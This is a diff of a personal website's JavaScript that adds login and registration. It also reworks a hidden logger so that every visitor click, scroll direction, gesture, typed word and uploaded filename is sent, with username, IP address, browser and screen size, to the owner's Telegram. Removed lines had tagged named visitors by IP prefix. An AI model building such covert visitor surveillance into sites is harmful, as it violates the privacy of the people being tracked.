@@ -1,3 +1,5 @@
+
+
 document.addEventListener("DOMContentLoaded", () => {
   const menu = document.getElementById("menu");
   const menuleft = document.getElementById("menuleft");
@@ -22,6 +24,10 @@ const menuSugestao = document.getElementById("menuSugestao");
 const newWordInput = document.getElementById("new-word");
 const addWordBtn = document.getElementById("add-word");
 const imageInput = document.getElementById("new-image");
+
+document.getElementById("login-btn").addEventListener("click", login);
+document.getElementById("register-btn").addEventListener("click", register);
+
 
 
   let sendingAlertVisitas = false;
@@ -49,33 +55,233 @@ function abrirModalDinamico(titulo, conteudo, botoes = []) {
   overlay.classList.add("active");
 }
 
-  /**
- * @param {string} message
- */
-async function sendTelegramInteracoes(message, ip = "") {
-  if (ip.startsWith("164.")) {
-    message = `Meu bem\n${message}`;
-  }
-  if (ip.startsWith("179.")) {
-    message = `Kal\n${message}`;
-  }
+// ---------- INICIO DO SISTEMA DE LOGS EM FILA ----------
 
-  if (sendingAlertInteracoes) return;
-  sendingAlertInteracoes = true;
+const userLogsQueue = [];
+let sendingLogs = false;
 
+// Escapa caracteres especiais do MarkdownV2
+function escapeMarkdown(text) {
+  if (!text) return "";
+  return text
+    .replace(/_/g, "\\_")
+    .replace(/\*/g, "\\*")
+    .replace(/\[/g, "\\[")
+    .replace(/\]/g, "\\]")
+    .replace(/\(/g, "\\(")
+    .replace(/\)/g, "\\)")
+    .replace(/~/g, "\\~")
+    .replace(/`/g, "\\`")
+    .replace(/>/g, "\\>")
+    .replace(/#/g, "\\#")
+    .replace(/\+/g, "\\+")
+    .replace(/-/g, "\\-")
+    .replace(/=/g, "\\=")
+    .replace(/\|/g, "\\|")
+    .replace(/\{/g, "\\{")
+    .replace(/\}/g, "\\}")
+    .replace(/\./g, "\\.")
+    .replace(/!/g, "\\!");
+}
+
+// Emoji por tipo de ação
+function getActionEmoji(action) {
+  action = action.toLowerCase();
+  if (action.includes("erro") || action.includes("fail") || action.includes("❌")) return "🔴";
+  if (action.includes("success") || action.includes("✅") || action.includes("adicionou")) return "🟢";
+  if (action.includes("aviso") || action.includes("⚠️") || action.includes("warning")) return "🟡";
+  if (action.includes("info") || action.includes("ℹ️")) return "🔵";
+  return "🟣";
+}
+
+// Mini gráfico de status com emojis
+function getMiniGraph(index) {
+  const blocks = ["⬛","🟩","🟨","🟧","🟥"];
+  return blocks[index % blocks.length].repeat(5);
+}
+
+function formatTimestampBR(ts) {
+  const date = new Date(ts);
+
+  // Opções para horário de Brasília
+  const options = {
+    timeZone: "America/Sao_Paulo",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: false,
+  };
+
+  // Formata com Intl.DateTimeFormat
+  const formatter = new Intl.DateTimeFormat("pt-BR", options);
+  const [
+    { value: day },,
+    { value: month },,
+    { value: year },,
+    { value: hour },,
+    { value: minute },,
+    { value: second }
+  ] = formatter.formatToParts(date);
+
+  return `🕒 *${day}/${month}/${year} ${hour}:${minute}:${second} BRT*`;
+}
+
+
+// Formata cada log como cartão cinematográfico
+function formatLogMessage(log, index = null) {
+  const idx = index !== null ? `#${index + 1} ` : "";
+  const emoji = getActionEmoji(log.actionType);
+  const graph = getMiniGraph(index);
+
+  return `
+${graph} *${emoji} LOG ${idx}* ${graph}
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+👤 Usuário: ${escapeMarkdown(log.user)}
+🌐 IP: ${escapeMarkdown(log.ip)}
+⚡ Ação: ${escapeMarkdown(log.actionType)}
+🎯 Alvo: ${escapeMarkdown(log.target || "")}
+🔎Tamanho: ${escapeMarkdown(log.tamanho || "Nada Encontrado")}
+📝 Descrição: ${escapeMarkdown(log.description || "Nada Encontrado")}
+⏱️ Data: ${escapeMarkdown(log.timestamp)}
+┗━━━━━━━━━━━━━━━━━━━━━━━┛`;
+}
+function getUserEnvironment() {
+  const ua = navigator.userAgent;
+
+  let browser = "Desconhecido";
+  if (ua.includes("Firefox")) browser = "Firefox";
+  else if (ua.includes("Chrome") && !ua.includes("Edge")) browser = "Chrome";
+  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+  else if (ua.includes("Edge")) browser = "Edge";
+  else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+
+  let os = "Desconhecido";
+  if (ua.includes("Windows")) os = "Windows";
+  else if (ua.includes("Macintosh")) os = "Mac";
+  else if (ua.includes("Linux")) os = "Linux";
+  else if (/Android/.test(ua)) os = "Android";
+  else if (/iPhone|iPad|iPod/.test(ua)) os = "iOS";
+
+  return `${browser} / ${os}`;
+}
+
+function getScreenInfo() {
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const innerWidth = window.innerWidth;
+  const innerHeight = window.innerHeight;
+
+  return `🖥️ Tela: ${screenWidth}x${screenHeight} | 🪟 Área visível: ${innerWidth}x${innerHeight}`;
+}
+
+// Adiciona log à fila
+function enqueueLog(action, target = "", extra = "") {
+  const username = usernameSpan?.textContent || "guest";
+  userLogsQueue.push({
+    timestamp: new Date().toISOString(),
+    user: username,
+    ip: userip,
+    actionType: action,
+    target: getUserEnvironment(),
+    tamanho: getScreenInfo(),
+    description: extra
+  });
+}
+
+// Envia batch de logs para Telegram
+async function sendBatch(message) {
   try {
-    const res = await fetch("/api/send-telegram-alert", {
+    await fetch("/api/send-telegram-alert", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message, type: "interacoes" }),
     });
-
-    const data = await res.json();
-    if (!data.success) throw new Error(data.error || "Erro desconhecido");
-  } finally {
-    sendingAlertInteracoes = false;
+  } catch (err) {
+    console.error("Erro ao enviar batch:", err);
   }
 }
+
+// Envio periódico em batches (máx 4000 chars)
+setInterval(async () => {
+  if (sendingLogs || userLogsQueue.length === 0) return;
+  sendingLogs = true;
+
+  const logsToSend = [...userLogsQueue];
+  userLogsQueue.length = 0;
+
+  const maxLength = 4000;
+  let currentBatch = [];
+  let currentLength = 0;
+
+  try {
+    logsToSend.forEach((log, i) => {
+      const msg = formatLogMessage(log, i);
+
+      if (currentLength + msg.length > maxLength) {
+        const batchMessage = `✨ *📋 Batch de Logs* (${currentBatch.length} itens)\n` +
+                             currentBatch.join("\n\n") +
+                             `\n💫 Fim do Batch`;
+        sendBatch(batchMessage);
+        currentBatch = [];
+        currentLength = 0;
+      }
+
+      currentBatch.push(msg);
+      currentLength += msg.length;
+    });
+
+    if (currentBatch.length) {
+      const batchMessage = `✨ *📋 Batch de Logs* (${currentBatch.length} itens)\n` +
+                           currentBatch.join("\n\n") +
+                           `\n💫 Fim do Batch`;
+      sendBatch(batchMessage);
+    }
+
+  } catch (err) {
+    console.error("Erro ao enviar logs em batches:", err);
+    userLogsQueue.unshift(...logsToSend);
+  } finally {
+    sendingLogs = false;
+  }
+}, 30000);
+
+
+window.addEventListener("beforeunload", () => {
+  if (userLogsQueue.length > 0) {
+    localStorage.setItem("pendingLogs", JSON.stringify(userLogsQueue));
+  }
+});
+
+// Recupera logs salvos do localStorage
+const pending = localStorage.getItem("pendingLogs");
+if (pending) {
+  try {
+    const recovered = JSON.parse(pending);
+    if (Array.isArray(recovered) && recovered.length > 0) {
+      userLogsQueue.push(...recovered);
+      console.log("📥 Logs recuperados do localStorage:", recovered.length);
+    }
+    localStorage.removeItem("pendingLogs"); // limpa após recuperar
+  } catch (err) {
+    console.error("Erro ao recuperar logs pendentes:", err);
+    localStorage.removeItem("pendingLogs");
+  }
+}
+
+
+
+
+
+window.addEventListener("load", () => {
+  const pending = JSON.parse(localStorage.getItem("pendingTelegramEvents") || "[]");
+  pending.forEach(msg => enqueueTelegram(msg));
+  localStorage.removeItem("pendingTelegramEvents");
+});
+
+
 
   /**
  * @param {string} message
@@ -125,7 +331,6 @@ async function fetchUserIP() {
     const res = await fetch("/api/get-ip");
     const data = await res.json();
     userip = data.ip || "";
-    console.log("IP do usuário:", userip);
   } catch (err) {
     console.error("Erro ao obter IP do usuário:", err);
   }
@@ -150,19 +355,19 @@ fetchUserIP();
     switch (type) {
       case "success":
         notif.style.backgroundColor = "#4CAF50"; 
-        logInteracaoTelegram("✅ Notificação de sucesso exibida", userip);
+        enqueueLog("✅ Notificação de sucesso exibida");
         break;
       case "error":
         notif.style.backgroundColor = "#f44336"; 
-        logInteracaoTelegram("❌ Notificação de erro exibida", userip);
+        enqueueLog("❌ Notificação de erro exibida");
         break;
       case "warning":
         notif.style.backgroundColor = "#ff9800"; 
-        logInteracaoTelegram("⚠️ Notificação de aviso exibida", userip);
+         enqueueLog("⚠️ Notificação de aviso exibida");
         break;
       default:
         notif.style.backgroundColor = "#1e1e2f"; 
-        logInteracaoTelegram("ℹ️ Notificação informativa exibida", userip);
+        enqueueLog("ℹ️ Notificação informativa exibida");
     }
 
     notif.classList.add("show");
@@ -268,7 +473,7 @@ fetchUserIP();
     menu.style.display = "none";
     menuleft.style.display = "none";
     counters.style.display = "block";
-logInteracaoTelegram("⏳ Usuário abriu Contadores", userip);
+    enqueueLog("⏳ Usuário abriu Contadores");
     const loadingEl = document.getElementById("counter-loading");
     loadingEl.style.display = "block";
 
@@ -291,40 +496,7 @@ logInteracaoTelegram("⏳ Usuário abriu Contadores", userip);
     }
   }
 
-async function logInteracaoTelegram(message, ip = "") {
-  try {
-    if (ip.startsWith("164.163.")) message = `Fernanda\n${message}`;
-    else if (ip.startsWith("179.127.")) message = `Kal\n${message}`;
-    else if (ip.startsWith("186.")) message = `Fer\n${message}`;
 
-    await sendTelegramInteracoes(message);
-  } catch (err) {
-    console.error("Erro ao logar interação:", err);
-  }
-}
-
-
-    async function sendTelegramInteracoes(message) {
-      try {
-        await fetch("/api/send-telegram-alert", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ message, type: "interacoes" }),
-        });
-      } catch (err) {
-        console.error("Erro ao enviar interação para Telegram:", err);
-      }
-    }
-
-
-
-
-  document.querySelectorAll("button[data-descricao]").forEach((btn) => {
-    btn.addEventListener("click", () => {
-      const descricao = btn.getAttribute("data-descricao");
-      logInteracaoTelegram(`🖱️ Clique no botão: ${descricao}`, userip);
-    });
-  });
 
   const poemBtn = document.getElementById("poem-btn");
   const poemText = document.getElementById("poem-text");
@@ -333,7 +505,7 @@ async function logInteracaoTelegram(message, ip = "") {
 poemBtn.addEventListener("click", async () => {
   mostrarModal(poemModal);
 
-  logInteracaoTelegram("📜 Usuário abriu Poema do Dia", userip);
+  enqueueLog("📜 Usuário abriu Poema do Dia");
 
   const poemTextEl = document.getElementById("poem-text");
   poemTextEl.textContent = "⌛ Carregando poema...";
@@ -344,7 +516,7 @@ poemBtn.addEventListener("click", async () => {
     poemTextEl.textContent = data.poem || "💖 Nenhum poema disponível 💖";
   } catch (err) {  
     poemTextEl.textContent = "❌ Erro ao carregar poema 😢";
-    logInteracaoTelegram("❌ Erro ao carregar Poema do Dia", userip);
+    enqueueLog("❌ Erro ao carregar Poema do Dia");
   }
 });
 
@@ -356,13 +528,13 @@ if (closePoemBtn) {
     poemModal.style.display = "none"; // fecha apenas o modal do poema
     poemModal.classList.remove("show"); // remove classe show, se estiver usando
     overlay.classList.remove("active"); // remove overlay se quiser
-    logInteracaoTelegram("📜 Usuário fechou Poema do Dia", userip);
+    enqueueLog("📜 Usuário fechou Poema do Dia");
   });
 }
 
 avisosBackBtn?.addEventListener("click", () => {
   fecharTodosModais();
-  logInteracaoTelegram("🔔 Usuário fechou Avisos", userip);
+  enqueueLog("🔔 Usuário fechou Avisos");
 });
 
 pollsBackBtn?.addEventListener("click", fecharTodosModais);
@@ -396,6 +568,7 @@ btn.addEventListener("click", () => {
   btn.setAttribute("data-open", (!isOpen).toString());
   btn.setAttribute("aria-expanded", (!isOpen).toString());
   sidebar.classList.toggle("open");
+  enqueueLog("Abriu/Fechou a aba Lateral");
 });
 
 overlay.addEventListener("click", () => {
@@ -404,7 +577,7 @@ overlay.addEventListener("click", () => {
   modals.forEach(modal => modal.classList.remove('show'));
   overlay.classList.remove("active");
 
-   modals.forEach(modal => logInteracaoTelegram(`❌ Usuário fechou modal ${modal.id} clicando fora`, userip));
+modals.forEach(modal => enqueueLog("❌ Fechou modal clicando fora", modal.id));
   // Restaurar menus
   menu.style.display = "flex";
   menuleft.style.display = "flex";
@@ -443,7 +616,7 @@ overlay.addEventListener("click", () => {
 
   menuSobre.addEventListener("click", () => {
   mostrarModal(sobreModal);
-  logInteracaoTelegram("ℹ️ Usuário abriu Sobre este site", userip);
+enqueueLog("modal_open", "sobreModal", "Usuário abriu Sobre este site");
 });
 
   sobreClose.addEventListener("click", () => {
@@ -454,7 +627,7 @@ overlay.addEventListener("click", () => {
   menu.style.display = "flex";         // restaura menus
   menuleft.style.display = "flex";
 
-  logInteracaoTelegram("ℹ️ Usuário fechou Sobre este site", userip);
+  enqueueLog("ℹ️ Usuário fechou Sobre este site");
 });
 
 
@@ -505,85 +678,8 @@ window.addWordToBoard = addWordToBoard;
   const modalContent = document.getElementById("modalContent");
   let sendingAlert = false;
 
-  menuDelete?.addEventListener("click", () => {
-    confirmModal.classList.add("show");
-    modalContent.innerHTML = `
-    <h2>Você deseja apagar este site?</h2>
-    <p>Isso fará tudo ser apagado permanentemente.</p>
-    <div class="buttons">
-      <button id="yesBtn">Sim</button>
-      <button id="noBtn">Não</button>
-    </div>
-  `;
-    addFirstStepEvents();
-    logInteracaoTelegram("🖱️ Usuário Clicou Botão Delete (menu laateral)", userip);
-  });
 
-  function addFirstStepEvents() {
-    sidebar.classList.remove("open");
-    overlay.classList.remove("active");
-    btn.setAttribute("data-open", "false");
-    btn.setAttribute("aria-expanded", "false");
-    document.getElementById("yesBtn").addEventListener("click", () => {
-      modalContent.innerHTML = `
-      <h2>Confirme novamente sua escolha para acabar com tudo!</h2>
-      <p>Se sim, após 12h ele deixará de existir.</p>
-      <div class="buttons">
-        <button id="yesFinalBtn">Sim</button>
-        <button id="noFinalBtn">Não</button>
-      </div>
-    `;
-      addSecondStepEvents();
-      logInteracaoTelegram("🖱️ Modal Delete: primeira confirmação'sim'", userip);
-    });
 
-    document.getElementById("noBtn").addEventListener("click", async () => {
-      try {
-        await sendTelegramInteracoes("✅ Usuário cancelou a ação na primeira etapa."
-        );
-      } catch (err) {
-        console.error("Erro:", err);
-      } finally {
-        confirmModal.classList.remove("show");
-      }
-      logInteracaoTelegram("🖱️ Modal Delete: primeira confirmação 'Não'", userip);
-    });
-  }
-
-  function addSecondStepEvents() {
-    document
-      .getElementById("yesFinalBtn")
-      .addEventListener("click", async () => {
-        try {
-          await sendTelegramInteracoes("⚠️ Alerta: site será deletado!");
-          showNotification(
-            "⚠️ Ação confirmada, site será deletado em até 12h!",
-            "warning"
-          );
-        } catch (err) {
-          console.error(err);
-          alert("Erro ao enviar notificação: " + err.message);
-        } finally {
-          confirmModal.classList.remove("show");
-        }
-        logInteracaoTelegram("🖱️ Modal Delete: segunda confirmação 'Sim'", userip);
-      });
-
-    document
-      .getElementById("noFinalBtn")
-      .addEventListener("click", async () => {
-        try {
-          await sendTelegramInteracoes("✅ Usuário cancelou a ação na primeira etapa.");
-          showNotification("Você desistiu de deletar o site, qbom!", "success");
-        } catch (err) {
-          console.error(err);
-          alert("Erro ao enviar notificação: " + err.message);
-        } finally {
-          confirmModal.classList.remove("show");
-        }
-         logInteracaoTelegram("🖱️ Modal Delete: segundaa confirmação 'Não'", userip);
-      });
-  }
 
  const suggestionModal = document.getElementById("suggestionModal");
 const closeSuggestionBtn = document.getElementById("closeSuggestion");
@@ -591,13 +687,13 @@ const closeSuggestionBtn = document.getElementById("closeSuggestion");
 menuSugestao.addEventListener("click", () => {
   if (!suggestionModal) return;
   suggestionModal.classList.add("show"); // ou style.display = "block"
-  logInteracaoTelegram("✏️ Usuário abriu Sugestões/Reclamações", userip);
+  enqueueLog("✏️ Usuário abriu Sugestões/Reclamações");
 });
 
 closeSuggestionBtn?.addEventListener("click", () => {
   if (!suggestionModal) return;
   suggestionModal.classList.remove("show"); // ou style.display = "none"
-  logInteracaoTelegram("✏️ Usuário fechou Sugestões/Reclamações", userip);
+  enqueueLog("✏️ Usuário fechou Sugestões/Reclamações");
 });
 
 
@@ -621,7 +717,7 @@ document.getElementById("sendSuggestion").addEventListener("click", async () => 
     showNotification("✅ Sugestão enviada com sucesso!", "success");
     textEl.value = "";
     fecharTodosModais();
-    logInteracaoTelegram("✏️ Usuário enviou uma sugestão com sucesso", userip);
+    enqueueLog("✏️ Usuário enviou uma sugestão com sucesso");
   } catch (err) {
     if (err.name === "AbortError") {
       console.log("Envio de sugestão abortado pelo fechamento do modal");
@@ -635,30 +731,8 @@ document.getElementById("sendSuggestion").addEventListener("click", async () => 
 // Abortar fetch se o usuário fechar o modal
 document.getElementById("closeSuggestion").addEventListener("click", () => {
   fecharTodosModais();
-  logInteracaoTelegram("✏️ Usuário fechou Sugestões/Reclamações antes de enviar", userip);
+  enqueueLog("✏️ Usuário fechou Sugestões/Reclamações antes de enviar");
 });
-
-
-/**
- * Rastreia scroll contínuo de um elemento e envia alerta ao Telegram
- * @param {HTMLElement} element 
- * @param {string} message 
- * @param {number} interval 
- */
-function trackContinuousScroll(element, message, interval = 250) {
-  if (!element) return; // evita erro se o elemento não existir
-
-  let lastSent = 0;
-  element.addEventListener("scroll", () => {
-    const now = Date.now();
-    if (now - lastSent < interval) return;
-    lastSent = now;
-
-    sendTelegramInteracoes(message).catch((err) =>
-      console.error("Erro ao enviar scroll (interações):", err)
-    );
-  });
-}
 
 function getGithubRawUrl(filename) {
   if (!filename) return "";
@@ -694,74 +768,34 @@ imageInput.addEventListener("change", () => {
         showNotification(`✅ Palavra "${word}" adicionada!`, "success");
         loadWords(); 
         newWordInput.value = "";
-                logInteracaoTelegram("🖱️ Usuário clicou: Adicionou uma nova palavra", userip)
+        enqueueLog("🖱️ Usuário clicou: Adicionou uma nova palavra")
       } else {
         showNotification(
           `❌ Erro ao adicionar: ${result.error || "desconhecido"}`,
           "error"
         );
-         logInteracaoTelegram("❌ Erro ao carregar palavras do Quadro de Palavras", userip);
+        enqueueLog("❌ Erro ao carregar palavras do Quadro de Palavras");
       }
     } catch (err) {
       console.error(err);
       showNotification("❌ Falha na conexão ao adicionar palavra.", "error");
-       logInteracaoTelegram("❌ Falha na conexão ao adicionar palavra no Quadro de Palavras", userip);
+      enqueueLog("❌ Falha na conexão ao adicionar palavra no Quadro de Palavras");
     }
-  });
-
-
-
-
-
-
-
-
-/**
- * Rastreia scroll da página inteira e envia alerta ao Telegram
- * @param {string} message
- * @param {number} interval
- */
-function trackPageScroll(message, interval = 250) {
-  let lastSent = 0;
-
-  window.addEventListener("scroll", () => {
-    const now = Date.now();
-    if (now - lastSent < interval) return;
-    lastSent = now;
-
-    sendTelegramInteracoes(message).catch((err) =>
-      console.error("Erro ao enviar scroll (interações):", err)
-    );
-})};
-
-trackPageScroll("ℹ️ Usuário rolou a página!");
-
-// Chamadas separadas, **fora da função**:
-trackContinuousScroll(document.getElementById("poem-body"), "📜 Usuário rolou o poema!");
-trackContinuousScroll(document.getElementById("sobre-body"), "ℹ️ Usuário rolou conteúdo do Sobre!");
-trackContinuousScroll(document.getElementById("suggestionText"), "✏️ Usuário rolou a textarea de sugestão!");
-trackContinuousScroll(document.getElementById("avisos-list"), "🔔 Usuário rolou a lista de avisos!");
-trackContinuousScroll(document.getElementById("polls-list"), "📊 Usuário rolou a lista de votações!");
-trackContinuousScroll(document.getElementById("today-drawing"), "🎨 Usuário rolou o desenho do dia!");
-trackContinuousScroll(document.getElementById("word-board"), "📝 Usuário rolou o quadro de palavras!");
-trackContinuousScroll(document.getElementById("custom-body"), "🧩 Usuário rolou o modal customizado!");
-
-
-  
+  });  
 
 
 // Abrir e voltar do Quadro de Palavras
 btnAbrirQuadro?.addEventListener("click", () => {
   [menu, menuleft, counters].forEach(el => el.style.display = "none");
   Newboard.style.display = "block";
-  logInteracaoTelegram("📝 Usuário abriu Quadro de Palavras", userip);
+enqueueLog("section_open", "Newboard", "Usuário abriu Quadro de Palavras");
 });
 
 backBoardBtn?.addEventListener("click", () => {
   Newboard.style.display = "none";
   menu.style.display = "flex";
   menuleft.style.display = "flex";
-  logInteracaoTelegram("📝 Usuário voltou ao menu do Quadro de Palavras", userip);
+  enqueueLog("📝 Usuário voltou ao menu do Quadro de Palavras");
 });
 
 // Enter no input adiciona a palavra
@@ -789,8 +823,7 @@ async function addWord(word) {
       showNotification("✅ Palavra adicionada!", "success");
       loadWords();
       newWordInput.value = "";
-      logInteracaoTelegram(`📝 Usuário adicionou palavra: ${word}`, userip);
-    } else {
+enqueueLog("add_word", "new-word", `Palavra adicionada: ${word}`);    } else {
       showNotification(`❌ Erro ao adicionar palavra: ${result.error || "desconhecido"}`, "error");
     }
   } catch (err) {
@@ -817,7 +850,7 @@ async function addImage(imageFile) {
       showNotification("✅ Imagem adicionada!", "success");
       loadWords();
       imageInput.value = "";
-      logInteracaoTelegram(`🖼️ Usuário adicionou imagem: ${imageFile.name}`, userip);
+      enqueueLog(`🖼️ Usuário adicionou imagem: ${imageFile.name}`);
     } else {
       showNotification(`❌ Erro ao adicionar imagem: ${result.error || "desconhecido"}`, "error");
     }
@@ -836,7 +869,7 @@ async function addImage(imageFile) {
   if (openTodayBtn && todayModal) {
   openTodayBtn.addEventListener("click", async () => {
     mostrarModal(todayModal);
-    logInteracaoTelegram("🎨 Usuário abriu Desenhos", userip);
+    enqueueLog("🎨 Usuário abriu Desenhos");
 
     const container = document.getElementById("today-drawing");
     if (container) container.textContent = "⌛ Carregando desenho...";
@@ -852,12 +885,12 @@ async function addImage(imageFile) {
             : `<p style="font-style:italic;">${data.content}</p>`;
         } else {
           container.textContent = "❌ Não foi possível carregar o desenho de hoje!";
-          logInteracaoTelegram("❌ Erro ao carregar desenho do dia", userip);
+          enqueueLog("❌ Erro ao carregar desenho do dia");
         }
       }
     } catch (err) {
       if (container) container.textContent = "⚠️ Erro de conexão ao buscar o desenho.";
-      logInteracaoTelegram("❌ Erro de conexão ao buscar desenho do dia", userip);
+      enqueueLog("❌ Erro de conexão ao buscar desenho do dia");
     }
   });
 }
@@ -865,7 +898,7 @@ async function addImage(imageFile) {
 
 backFromTodayBtn.addEventListener("click", () => {
   fecharTodosModais();
-  logInteracaoTelegram("🎨 Usuário fechou Desenho do Dia", userip);
+  enqueueLog("🎨 Usuário fechou Desenho do Dia");
 });
 
 
@@ -902,7 +935,7 @@ backFromTodayBtn.addEventListener("click", () => {
 menuAvisos.addEventListener("click", async e => {
     e.preventDefault();
     mostrarModal(avisosModal);
-logInteracaoTelegram("🔔 Usuário abriu avisos", userip);
+    enqueueLog("🔔 Usuário abriu avisos");
 
     const avisosList = document.getElementById("avisos-list");
     avisosList.innerHTML = "⌛ Carregando avisos...";
@@ -924,7 +957,7 @@ logInteracaoTelegram("🔔 Usuário abriu avisos", userip);
   }
 } catch (err) {
   avisosList.innerHTML = "<p>Erro ao carregar avisos 😢</p>";
-  logInteracaoTelegram("❌ Erro ao carregar avisos", userip);
+  enqueueLog("❌ Erro ao carregar avisos");
 }
 });
 
@@ -957,7 +990,7 @@ logInteracaoTelegram("🔔 Usuário abriu avisos", userip);
  menuPolls.addEventListener("click", async e => {
     e.preventDefault();
     mostrarModal(pollsModal);
-logInteracaoTelegram("📊 Usuário abriu votações", userip);
+    enqueueLog("📊 Usuário abriu votações");
 
     const pollsList = document.getElementById("polls-list");
     pollsList.innerHTML = "⌛ Carregando votações...";
@@ -995,7 +1028,7 @@ logInteracaoTelegram("📊 Usuário abriu votações", userip);
       });
     } catch (err) {
       pollsList.innerHTML = "<p>Erro ao carregar votações 😢</p>";
-      logInteracaoTelegram("❌ Erro ao carregar votações", userip);
+      enqueueLog("❌ Erro ao carregar votações");
     }
   });
 
@@ -1003,7 +1036,7 @@ logInteracaoTelegram("📊 Usuário abriu votações", userip);
 document.getElementById("counter-btn").addEventListener("click", showCounters);
   document.getElementById("back-btn").addEventListener("click", backToMenu);
  document.getElementById("calendar-btn").addEventListener("click", () => { 
-    logInteracaoTelegram("📅 Usuário abriu Calendário", userip)
+enqueueLog("click", "calendar-btn", "Usuário abriu Calendário");
     window.location.href = "calendar.html"; 
 });  
 
@@ -1054,7 +1087,6 @@ async function loadGithubImages() {
     galleryContainer.innerHTML = "<p>❌ Nenhuma imagem encontrada</p>";
     return;
   }
-  logInteracaoTelegram("🖼️ Usuário abriu Galeria do GitHub", userip);
   // Ordena do mais antigo para o mais novo
   files.sort((a, b) => a.date - b.date);
 
@@ -1111,7 +1143,7 @@ function renderFeatured(file) {
   const btn = featuredContainer.querySelector(".download-btn");
 btn.addEventListener("click", () => {
   downloadImage(file.download_url, file.name);
-  logInteracaoTelegram(`⬇️ Usuário baixou imagem: ${file.name}`, userip);
+  enqueueLog(`⬇️ Usuário baixou imagem: ${file.name}`);
 });
 }
 
@@ -1135,7 +1167,7 @@ function renderGallery(thumbnails, allImages, featuredIndex) {
       featuredIndex = allImages.indexOf(newFeatured);
       renderFeatured(newFeatured);  // botão de download é gerado aqui
       renderGallery(thumbnails, allImages, featuredIndex);
-      logInteracaoTelegram(`🖼️ Usuário trocou destaque para: ${imgFile.name}`, userip);
+      enqueueLog(`🖼️ Usuário trocou destaque para: ${imgFile.name}`);
     });
 
     card.appendChild(imgEl);
@@ -1143,12 +1175,286 @@ function renderGallery(thumbnails, allImages, featuredIndex) {
   });
 }
 
+// pegar elementos
+const authDiv = document.getElementById("auth");
+const appDiv = document.getElementById("app");
+const usernameSpan = document.getElementById("username");
+
+// alternar login/registro
+document.getElementById("show-register").addEventListener("click", () => {
+  enqueueLog("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
+  document.getElementById("login-box").classList.add("hidden");
+  document.getElementById("register-box").classList.remove("hidden");
+});
+
+document.getElementById("show-login").addEventListener("click", () => {
+  enqueueLog("🔐 Usuário clicou em 'Já tem conta? Login'");
+  document.getElementById("register-box").classList.add("hidden");
+  document.getElementById("login-box").classList.remove("hidden");
+});
 
 
+
+
+// checar login
+async function checkLogin() {
+  try {
+    const res = await fetch("/api/me");
+    const data = await res.json();
+
+    if (data.loggedIn) {
+      authDiv.style.display = "none";
+      appDiv.style.display = "flex";
+appDiv.style.flexDirection = "column";
+appDiv.style.justifyContent = "center";
+appDiv.style.alignItems = "center";
+
+      
+      usernameSpan.textContent = data.user.username;
+    } else {
+      authDiv.style.display = "flex"; // ou block, dependendo do CSS
+      appDiv.style.display = "none";
+      document.getElementById("login-box").classList.remove("hidden");
+      document.getElementById("register-box").classList.add("hidden");
+    }
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+// login
+async function login() {
+  const username = document.getElementById("login-username").value;
+  const password = document.getElementById("login-password").value;
+
+  const res = await fetch("/api/login", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ username, password })
+  });
+
+  const data = await res.json();
+  if (data.success) {
+    authDiv.style.display = "none";
+    appDiv.style.display = "block";
+    usernameSpan.textContent = username;
+  } else {
+    alert(data.error || "Erro ao logar");
+  }
+}
+
+// registro
+async function register() {
+  const username = document.getElementById("register-username").value;
+  const password = document.getElementById("register-password").value;
+
+  const res = await fetch("/api/register", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ username, password })
+  });
+
+  const data = await res.json();
+  if (data.success) {
+    authDiv.style.display = "none";
+    appDiv.style.display = "block";
+    usernameSpan.textContent = username;
+  } else {
+    alert(data.error || "Erro ao registrar");
+  }
+}
+
+// logout
+async function logout() {
+  await fetch("/api/logout", { method: "POST" });
+  authDiv.style.display = "flex";
+  appDiv.style.display = "none";
+}
+
+const menuLogout = document.getElementById("logout-btn");
+menuLogout.addEventListener("click", logout);
+
+// checa login ao carregar
+checkLogin();
 
 // Chama ao carregar a página
 loadGithubImages();
 
+
+function trackScrollMobile(element, message, interval = 300) {
+  if (!element) return;
+  let lastSent = 0;
+  let lastScrollTop = element.scrollTop || window.scrollY || 0;
+
+  element.addEventListener("scroll", () => {
+    const now = Date.now();
+    if (now - lastSent < interval) return;
+    lastSent = now;
+
+    const currentScrollTop = element.scrollTop || window.scrollY || 0;
+    const direction = currentScrollTop > lastScrollTop ? "⬇️ para baixo" : "⬆️ para cima";
+    lastScrollTop = currentScrollTop;
+
+    enqueueLog(`${message} (${direction})`);
+  });
+}
+
+// Exemplo de uso:
+trackScrollMobile(window, "ℹ️ Usuário rolou a página");
+trackScrollMobile(document.getElementById("poem-body"), "📜 Usuário rolou o poema!");
+trackScrollMobile(document.getElementById("sobre-body"), "ℹ️ Usuário rolou conteúdo do Sobre!");
+trackScrollMobile(document.getElementById("suggestionText"), "✏️ Usuário rolou textarea de sugestão!");
+trackScrollMobile(document.getElementById("word-board"), "📝 Usuário rolou quadro de palavras!");
+
+window.addEventListener("orientationchange", () => {
+  enqueueLog("orientation_change", "", `Mudança de orientação: ${screen.orientation.type}`);
+});
+
+document.addEventListener("touchmove", (e) => {
+  if (e.touches.length > 1) {
+enqueueLog("multitouch", "Usuário realizou gesto multitouch");  }
+});
+
+// captura login
+function sendLogToTelegram(message) {
+    enqueueLog(message);
+}
+
+// Função de captura e envio para log/Telegram
+function logLoginMovement(mensagem) {
+    enqueueLog(`Login: ${mensagem}`);
+    sendLogToTelegram(`🔐 Movimento no login: ${mensagem}`);
+}
+
+document.getElementById("login-btn").addEventListener("click", function () {
+    logLoginMovement("Tentativa de login enviada");
+    checkLogin();
+});
+
+document.getElementById("show-register").addEventListener("click", () => {
+    enqueueLog("✏️ Usuário clicou em 'Ainda não tem conta? Registrar'");
+});
+
+
+
+// Captura do clique no botão registrar
+document.getElementById("register-btn").addEventListener("click", function () {
+    enqueueLog("Usuário clicou em registrar");
+});
